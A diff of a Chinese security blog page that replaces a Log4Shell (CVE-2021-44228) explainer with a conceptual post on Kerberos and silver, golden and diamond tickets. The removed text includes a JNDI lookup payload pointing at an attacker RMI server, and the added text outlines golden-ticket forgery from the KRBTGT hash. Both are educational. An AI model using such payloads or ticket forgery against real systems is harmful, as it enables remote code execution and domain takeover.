@@ -16,21 +16,24 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CVE-2021-44228复现介绍：Apache log4j 2是一个Java的日志记录工具通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地 为控制台、文件、GUI组件等，被应用于业务系统开发，用于记录程序输入输出日志信息。 大致原理：log4j2中存在JNDI注入漏洞，log4j2会将用户输入的内容记录到日志当中，如果输入特殊字符串  会被log4j2解析然后调">
+    <meta name="description" content="票据及其相关的工作原理一、Kerberos1 啥是KerberosKerberos是一种网络认证协议，尤其适用于内网中的分布式系统，通过中央认证服务器来管理用户和服务身份的验证， 在内网中所实现的主要功能： 1.内网用户认证：确保只有通过认证的用户才能够访问内网中的资源 2.单点登录SSO：用户只需要登录一次便可以去访问内网中的所有支持Kerberos的服务  3.安全的服务访问：它利用 服务票据">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ljhflag">
-<meta property="og:url" content="http://example.com/2024/10/16/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="票据及其相关的工作原理">
+<meta property="og:url" content="http://example.com/2025/02/19/%E7%A5%A8%E6%8D%AE%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/index.html">
 <meta property="og:site_name" content="ljhflag">
-<meta property="og:description" content="CVE-2021-44228复现介绍：Apache log4j 2是一个Java的日志记录工具通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地 为控制台、文件、GUI组件等，被应用于业务系统开发，用于记录程序输入输出日志信息。 大致原理：log4j2中存在JNDI注入漏洞，log4j2会将用户输入的内容记录到日志当中，如果输入特殊字符串  会被log4j2解析然后调">
+<meta property="og:description" content="票据及其相关的工作原理一、Kerberos1 啥是KerberosKerberos是一种网络认证协议，尤其适用于内网中的分布式系统，通过中央认证服务器来管理用户和服务身份的验证， 在内网中所实现的主要功能： 1.内网用户认证：确保只有通过认证的用户才能够访问内网中的资源 2.单点登录SSO：用户只需要登录一次便可以去访问内网中的所有支持Kerberos的服务  3.安全的服务访问：它利用 服务票据">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-16T12:11:15.210Z">
-<meta property="article:modified_time" content="2024-10-16T12:14:59.743Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411132059856.png">
+<meta property="article:published_time" content="2025-02-19T14:27:00.000Z">
+<meta property="article:modified_time" content="2025-02-19T14:40:58.991Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411132059856.png">
   
   
   
-  <title>ljhflag</title>
+  <title>票据及其相关的工作原理 - ljhflag</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -225,7 +228,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="票据及其相关的工作原理"></span>
           
         </div>
 
@@ -236,8 +239,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-16 20:11" pubdate>
-          2024年10月16日 晚上
+        <time datetime="2025-02-19 22:27" pubdate>
+          2025年2月19日 晚上
         </time>
       </span>
     
@@ -248,7 +251,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          877 字
         
       </span>
     
@@ -259,7 +262,7 @@
         
         
         
-          14 分钟
+          8 分钟
         
       </span>
     
@@ -304,58 +307,44 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">票据及其相关的工作原理</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="CVE-2021-44228复现"><a href="#CVE-2021-44228复现" class="headerlink" title="CVE-2021-44228复现"></a>CVE-2021-44228复现</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>Apache log4j 2是一个Java的日志记录工具通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地 为控制台、文件、GUI组件等，被应用于业务系统开发，用于记录程序输入输出日志信息。</p>
-<h2 id="大致原理："><a href="#大致原理：" class="headerlink" title="大致原理："></a>大致原理：</h2><p>log4j2中存在<strong>JNDI注入漏洞</strong>，log4j2会将用户输入的内容记录到日志当中，如果输入特殊字符串  会被log4j2解析然后调用JNDI接口中的lookup方法 从而会远程下载恶意代码并执行</p>
-<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>JNDI（Java Naming and Directory Interface）是Java提供的一个标准接口，用于让应用程序能够方便地访问不同的命名和目录服务，比如LDAP、DNS等。它帮助Java应用程序通过统一的方式和不同的命名服务进行交互。**[LDAP是一种限制去访问其他目录以及外部资源的一种协议]**</p>
-<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a><strong>JNDI注入</strong></h2><p>是一种攻击方式，利用了JNDI接口的特点，让攻击者能够通过它执行远程代码。通俗地说，就是攻击者可以欺骗程序，让它从攻击者控制的服务器上下载并执行恶意代码。</p>
-<p>因为JNDI默认是建立在信任的基础上这意味着，一旦程序通过JNDI获取了一个对象或类，它会自动执行这个对象或类的代码</p>
-<p><strong>举个例子</strong>：</p>
+                <h1 id="票据及其相关的工作原理"><a href="#票据及其相关的工作原理" class="headerlink" title="票据及其相关的工作原理"></a>票据及其相关的工作原理</h1><h2 id="一、Kerberos"><a href="#一、Kerberos" class="headerlink" title="一、Kerberos"></a>一、Kerberos</h2><h3 id="1-啥是Kerberos"><a href="#1-啥是Kerberos" class="headerlink" title="1 啥是Kerberos"></a>1 啥是Kerberos</h3><p>Kerberos是一种网络认证协议，尤其适用于内网中的分布式系统，通过中央认证服务器来管理用户和服务身份的验证，</p>
+<p>在内网中所实现的主要功能：</p>
+<p>1.内网用户认证：确保只有通过认证的用户才能够访问内网中的资源</p>
+<p>2.单点登录SSO：用户只需要登录一次便可以去访问内网中的所有支持Kerberos的服务 </p>
+<p>3.安全的服务访问：它利用 <strong>服务票据</strong> 来确保用户和服务之间的通信是安全的，防止未授权的访问。</p>
+<p>4.防止密码泄露：Kerberos 避免了在网络上传输用户的明文密码，所有认证过程都通过加密的票据进行，增强了内网的安全性。</p>
+<h3 id="2-Kerberos工作原理"><a href="#2-Kerberos工作原理" class="headerlink" title="2 Kerberos工作原理"></a>2 Kerberos工作原理</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411132059856.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-13 204304"></p>
 <ol>
-<li>正常情况下，程序会通过JNDI从一个合法的服务器上下载所需的代码或数据。</li>
-<li>但是，如果存在安全漏洞，攻击者可以通过操纵JNDI的请求，告诉程序去连接到攻击者控制的恶意服务器。</li>
-<li>当程序连接到这个恶意服务器时，它会下载并执行攻击者的恶意代码，从而让攻击者在受害者的系统上运行任意代码，甚至完全控制系统。</li>
+<li><strong>身份验证请求（AS-REQ 和 AS-REP）</strong>：<ul>
+<li>客户端（例如用户的计算机）向 <strong>认证服务（AS）</strong> 发送请求，要求获得一个票据授权票（TGT，Ticket Granting Ticket）。请求中通常包括客户端的用户名。</li>
+<li>如果认证服务确认用户身份（通常通过用户名和密码验证），它会返回一个加密的 TGT 以及一个 <strong>会话密钥</strong>（用于客户端与授权服务之间的通信加密）。TGT 是由认证服务签发的，它可以用于获取访问其他服务的权限。</li>
+</ul>
+</li>
+<li><strong>票据授权请求（TGS-REQ 和 TGS-REP）</strong>：<ul>
+<li>客户端使用已获得的 TGT 向 <strong>票据授权服务（TGS）</strong> 发送请求，请求访问某个具体的服务（例如文件服务器、数据库等）。</li>
+<li>TGS 验证 TGT 的有效性，并根据请求的服务生成一个新的票据（服务票据），该票据加密了客户端的身份信息和会话密钥。TGS-REP 消息包含服务票据，客户端可以使用该票据访问目标服务。</li>
+</ul>
+</li>
+<li><strong>访问请求（AP-REQ 和 AP-REP）</strong>：<ul>
+<li>客户端将服务票据发送给目标服务进行访问验证。</li>
+<li>目标服务（例如应用服务器）解密票据，验证用户身份并生成响应。成功后，客户端和服务之间可以开始加密通信。</li>
+</ul>
+</li>
 </ol>
-<p>在 JNDI 注入攻击中，常用的攻击方式包括通过 <strong>RMI（远程方法调用）</strong> 和 <strong>LDAP（轻量级目录访问协议）</strong> 这两种服务。它们允许程序通过网络访问远程的资源，但在漏洞中，被攻击者利用来提供恶意代码。</p>
-<p>在这个漏洞中就是利用了LDAP</p>
-<h2 id="漏洞详细原理"><a href="#漏洞详细原理" class="headerlink" title="漏洞详细原理"></a>漏洞详细原理</h2><p>Log4j 之所以会解析类似于 <code>$&#123;jndi:rmi:192.168.23.134:1099/exp&#125;</code> 这样的字符串，主要是因为它提供了<strong>动态变量替换</strong>的功能。这种功能使得 Log4j 不仅仅是一个简单的日志记录工具，它能够根据日志消息的内容动态地解析和处理特定格式的字符串。</p>
-<h3 id="1-动态变量替换"><a href="#1-动态变量替换" class="headerlink" title="1. 动态变量替换"></a>1. 动态变量替换</h3><ul>
-<li>Log4j 支持在日志消息中使用变量和格式化信息。通过 <code>$&#123;&#125;</code> 语法，Log4j 可以将特定的内容替换为实际值。例如，你可以在日志中引用系统属性、环境变量或其他上下文信息。</li>
-</ul>
-<h3 id="2-JNDI-查找支持"><a href="#2-JNDI-查找支持" class="headerlink" title="2. JNDI 查找支持"></a>2. JNDI 查找支持</h3><ul>
-<li>Log4j2 引入了对 JNDI 的支持，使得应用程序可以在日志中引用 JNDI 查找。这样，当日志消息中包含 <code>$&#123;jndi:...&#125;</code> 的时候，Log4j 会尝试执行 JNDI 查找，以获取相关对象。这使得开发者能够灵活地使用外部资源，但也因此引入了安全风险。</li>
-</ul>
-<h3 id="3-解析和执行"><a href="#3-解析和执行" class="headerlink" title="3. 解析和执行"></a>3. 解析和执行</h3><ul>
-<li>当 Log4j 处理日志消息时，它会检查消息内容。如果发现 <code>$&#123;jndi:...&#125;</code> 这样的结构，它会调用 JNDI API 来执行查找。这个过程是动态的，Log4j 会连接到指定的 JNDI 服务（如 LDAP）而<code>$&#123;jndi:rmi:...&#125;</code>就是调用JNDI API来执行查找并且指定里了LDAP服务，然后就会获取返回的对象。</li>
-<li>如果返回的对象是一个 Java 类，Log4j 就会加载并执行它，这就是导致远程代码执行（RCE）漏洞的原因</li>
-</ul>
-<h2 id="拓展-Log4j"><a href="#拓展-Log4j" class="headerlink" title="拓展 Log4j"></a>拓展 Log4j</h2><p>Log4j 作为一个日志记录工具，提供解析和执行功能的原因主要是为了增强灵活性和扩展性，使得开发者能够根据实际需求动态生成和处理日志信息。下面是一些原因和具体的例子，说明为什么一个日志工具可能需要这些功能。</p>
-<h3 id="1-动态生成日志信息"><a href="#1-动态生成日志信息" class="headerlink" title="1. 动态生成日志信息"></a>1. 动态生成日志信息</h3><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><ul>
-<li>允许开发者在日志中插入动态值，比如用户信息、环境变量、系统状态等，从而使日志更具上下文和可读性。</li>
-</ul>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>假设一个 web 应用程序需要记录用户的登录活动，开发者可以在日志消息中使用动态变量：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.info(<span class="hljs-string">&quot;User &#123;&#125; logged in from IP: &#123;&#125;&quot;</span>, username, ipAddress);<br></code></pre></td></tr></table></figure>
-
-<p>在这条日志记录中，<code>&#123;&#125;</code> 会被替换为 <code>username</code> 和 <code>ipAddress</code> 的实际值。这样，记录的日志将包含用户的具体信息，方便后续审计和分析。</p>
-<h3 id="2-使用外部资源"><a href="#2-使用外部资源" class="headerlink" title="2. 使用外部资源"></a>2. 使用外部资源</h3><h4 id="目的-1"><a href="#目的-1" class="headerlink" title="目的"></a>目的</h4><ul>
-<li>允许从外部服务或资源获取数据，这样可以在日志中包含实时信息或相关对象。例如，获取配置值、统计信息或状态报告。</li>
-</ul>
-<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>如果一个应用程序希望在日志中记录当前数据库连接的状态，可以通过 JNDI 查找获取相应的状态信息：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.info(<span class="hljs-string">&quot;Current database connection: &#123;&#125;&quot;</span>, context.lookup(<span class="hljs-string">&quot;java:comp/env/jdbc/MyDataSource&quot;</span>));<br></code></pre></td></tr></table></figure>
-
-<p>在这个例子中，<code>lookup</code> 方法会查询命名服务并获取数据库连接对象的状态信息。这样，日志不仅可以记录信息，还可以提供上下文。</p>
-<h3 id="3-灵活的日志记录"><a href="#3-灵活的日志记录" class="headerlink" title="3. 灵活的日志记录"></a>3. 灵活的日志记录</h3><h4 id="目的-2"><a href="#目的-2" class="headerlink" title="目的"></a>目的</h4><ul>
-<li>根据不同的上下文和配置动态调整日志内容。例如，开发者可能希望在某些条件下记录额外的信息。</li>
-</ul>
-<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>在处理异常时，开发者可能希望在日志中记录更多的信息，如当前用户的上下文：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 可能抛出异常的代码</span><br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    logger.error(<span class="hljs-string">&quot;An error occurred for user &#123;&#125;: &#123;&#125;&quot;</span>, currentUser, e.getMessage());<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>这里，<code>currentUser</code> 是动态获取的用户信息，这样的日志记录可以帮助开发者快速定位问题。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>因此，Log4j 提供的解析和执行功能是为了增强日志记录的灵活性和实用性。虽然这些功能为开发者提供了更强大的工具，但也带来了安全风险。例如，如果日志输入未经过滤，攻击者可以利用这些动态功能执行恶意代码。为了安全，开发者在使用这些功能时需要谨慎，并确保输入被正确验证和清理。</p>
+<h3 id="黄金票据详解："><a href="#黄金票据详解：" class="headerlink" title="黄金票据详解："></a>黄金票据详解：</h3><p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8127868.html">https://www.cnblogs.com/backlion/p/8127868.html</a></strong></p>
+<h3 id="3-银票据黄金票据钻石票据概述以及它们之间的关系"><a href="#3-银票据黄金票据钻石票据概述以及它们之间的关系" class="headerlink" title="3 银票据黄金票据钻石票据概述以及它们之间的关系"></a>3 银票据黄金票据钻石票据概述以及它们之间的关系</h3><p>银票据只能通过伪造一个服务票据（TGS）去访问<strong>某个特定的服务</strong></p>
+<p>黄金票据是通过去伪造一个 Kerberos票据授权票（TGT） 该票据可以为攻击者提供对<strong>这个域中中几乎所有资源的访问权限</strong></p>
+<p>钻石票据攻击者伪造并利用*<em>多个域控制器上的 Kerberos 票据，以实现对*<em>跨域环境的权限提升和横向攻击</em></em></p>
+<h4 id="黄金票据（Golden-Ticket）工作原理："><a href="#黄金票据（Golden-Ticket）工作原理：" class="headerlink" title="黄金票据（Golden Ticket）工作原理："></a>黄金票据（Golden Ticket）工作原理：</h4><ol>
+<li><strong>获取 KRBTGT 密钥</strong>：攻击者首先需要在域控制器上获取 KRBTGT 账户的 NTLM 哈希。KRBTGT 是 Kerberos 的服务账户，负责签名和加密所有的 Kerberos 票据。</li>
+<li><strong>伪造票据</strong>：通过获得 KRBTGT 密钥，攻击者可以伪造一个 Kerberos 服务票据（TGT），该票据可以为攻击者提供对网络中几乎所有资源的访问权限。</li>
+<li><strong>访问权限</strong>：一旦拥有黄金票据，攻击者可以在网络中伪装成任何用户，甚至是域管理员，获取完全控制权，进行各种恶意活动。</li>
+</ol>
 
                 
               </div>
@@ -365,6 +354,13 @@
               <div class="post-metas my-3">
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+    </div>
+  
 </div>
 
 
@@ -373,8 +369,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>http://example.com/2024/10/16/Log4j2远程代码执行/</div>
+      <div>票据及其相关的工作原理</div>
+      <div>http://example.com/2025/02/19/票据及相关原理/</div>
     </div>
     <div class="license-meta">
       
@@ -386,7 +382,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月16日</div>
+          <div>2025年2月19日</div>
         </div>
       
       
@@ -418,9 +414,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/11/14/msf%E4%BD%BF%E7%94%A8/" title="MSF使用以及相关后续部分渗透思路">
+                      <a href="/2025/02/19/%E5%9F%9F%E3%80%81%E5%9F%9F%E6%8E%A7/" title="域、域控">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MSF使用以及相关后续部分渗透思路</span>
+                        <span class="hidden-mobile">域、域控</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -428,8 +424,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/02/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/" title="信息打点">
-                        <span class="hidden-mobile">信息打点</span>
+                      <a href="/2024/11/16/CobaltStrike%E7%9A%84%E4%BD%BF%E7%94%A8/" title="CobaltStrike的使用">
+                        <span class="hidden-mobile">CobaltStrike的使用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
